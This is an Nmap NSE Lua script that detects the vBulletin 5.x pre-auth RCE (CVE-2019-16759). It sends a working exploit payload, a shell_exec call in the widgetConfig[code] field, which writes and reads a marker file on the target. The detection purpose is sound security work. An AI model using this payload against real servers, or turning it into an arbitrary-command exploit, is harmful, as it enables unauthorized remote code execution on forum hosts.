description = [[
vBulletin 5.x 0day pre-auth RCE exploit
This should work on all versions from 5.0.0 till 5.5.4
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2019-16759 <target>
--
-- @output
-- PORT    STATE SERVICE
-- s4430/tcp  open  http
-- | http-vuln-cve2019-16759:
-- |   VULNERABLE
-- |   vBulletin 5.x 0day pre-auth RCE exploit
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2019-16759
-- |
-- |     Disclosure date: 2019-09-23
-- |     References:
-- |      https://seclists.org/fulldisclosure/2019/Sep/31
-- |_     https://nvd.nist.gov/vuln/detail/CVE-2019-16759
--
-- @args http-vuln-cve2019-16759.path The default URL path to request. The default is "/".

author = "r00tpgp"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "vBulletin 5.x 0day pre-auth RCE exploit",
    state = vulns.STATE.NOT_VULN,
    description = [[
vBulletin 5.x 0day pre-auth RCE exploit
This should work on all versions from 5.0.0 till 5.5.4
    ]],
    IDS = {
        CVE = "CVE-2019-16759"
    },
    references = {
        'https://seclists.org/fulldisclosure/2019/Sep/31',
	'https://nvd.nist.gov/vuln/detail/CVE-2019-16759',
    },
    dates = {
        disclosure = { year = '2019', month = '09', day = '23' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "POST"
  local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/index.php?routestring=ajax/render/widget_php"

  local body = {
   ["widgetConfig[code]"] = "echo shell_exec(\'echo h4x0000r > /tmp/nmap.check.out; cat /tmp/nmap.check.out\');exit;",
  }

   local options = {
    header = {
      Connection = "close",
      ["Content-Type"] = "application/x-www-form-urlencoded",
      ["User-Agent"] =  "curl/7.65.3",
      ["Accept"] = "*/*",
    },
    content = body
}
  local response = http.post(host, port, path, nil, nil, body)

  if response and string.match(response.body, "h4x0000r") then
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)
end
